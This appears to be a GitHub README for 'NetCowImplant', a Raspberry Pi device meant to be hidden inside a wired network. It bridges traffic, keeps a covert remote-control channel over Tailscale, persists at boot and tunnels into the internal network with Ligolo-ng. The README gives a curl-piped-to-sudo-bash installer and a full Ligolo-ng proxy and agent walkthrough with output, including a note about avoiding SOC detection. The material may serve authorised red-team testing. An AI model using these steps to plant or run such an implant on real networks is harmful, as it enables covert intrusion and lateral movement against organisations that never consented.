### 🐮 NetCowImplant

NetCowImplant is a stealthy, transparent implant designed to integrate into an existing wired network while preserving full network functionality for the bridged-through device

## It provides
    Ethernet bridging (eth0 <--> eth1)
    Out-of-band remote control Tailscale VPN
    Outbound Internet traffic routed via Wi-Fi
    Full persistence at boot
    Auto-installation with one command

## ✅ Requirements
    Raspberry Pi 4b
    Connected Wi-Fi network (wlan0) with Internet
    USB-Ethernet adapter (for second interface)
    Tailscale account
    Ligolo-ng

## 🌐 Tailscale Setup (Control Channel VPN)

```bash
https://tailscale.com/
```
<center>
<img src="https://github.com/TheLaughingCow/NetCowImplant/blob/main/tailscale01.png"/>
</center>

<center>
<img src="https://github.com/TheLaughingCow/NetCowImplant/blob/main/tailscale02.png"/>
</center>

## 🚀 Quick Install (auto-setup)
```bash
curl -sSL https://raw.githubusercontent.com/TheLaughingCow/NetCowImplant/main/install_implant.sh | sudo bash
```
<center>
<img src="https://github.com/TheLaughingCow/NetCowImplant/blob/main/NetCowImplant.gif"/>
</center>

Authenticate to tailscale using your authkey (or normal login):
```bash
sudo tailscale up --authkey tskey-auth-xxxxxxxxxxxxxxxx
```
Then:
```bash
sudo reboot
```

## 🆘 Help - Ligolo-ng

```bash
exegol-test /workspace # ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   
                                                                                                                     
  Made in France ♥            by @Nicocha30!                                                                         
  Version: 0.8                                                                                                       
```
```bash
ligolo-ng » interface_create --name "ligolo"
INFO[0014] Creating a new ligolo interface...           
INFO[0014] Interface created!                                                                                                  
```
```bash
ligolo-ng » certificate_fingerprint
INFO[0226] TLS Certificate fingerprint for ligolo is: XXXXXXXXXXXXXXXXXXXXXXX                                                                                               
```
```bash
ligolo-ng » interface_add_route --name ligolo --route X.X.X.0/24
INFO[0444] Route created.                                                                                              
```
Connect the Agent:
```bash
admin@IMP-CMP3:~$ ligolo -connect X.X.X.X:11601 -v -accept-fingerprint XXXXXXXXXXXXXXXXXXXXXXX
INFO[0000]/home/runner/work/ligolo-ng/ligolo-ng/cmd/agent/main.go:185 main.connect() Connection established    
                    addr="X.X.X.X:11601"                                                                                           
```
Then start session:
```bash
ligolo-ng » session
? Specify a session :  [Use arrows to move, type to filter]
> 1 - admin@IMP-CMP3 - X.X.X.X:48794 - d83ada5u1649
[Agent : admin@IMP-CMP3] » start
INFO[0144] Starting tunnel to admin@IMP-CMP3 (d83ada5u1649)                                                                                        
```

## Tested and validated on
    ✅ Raspberry Pi 4b (Kali Linux GUI)
    ✅ Raspberry Pi 4b (Ubuntu)
    ✅ Raspberry Pi 4b (Debian)
    ❌ NanoPi R2S

## ToDo
    Support 4G LTE
    Support NanoPi R2S
    
## Contributing

***/!\ All contributions are welcome /!\***

If you wish to contribute to the project, please submit your changes via pull requests on our GitHub repository.
We welcome contributions in code, documentation, testing, or any other improvements.
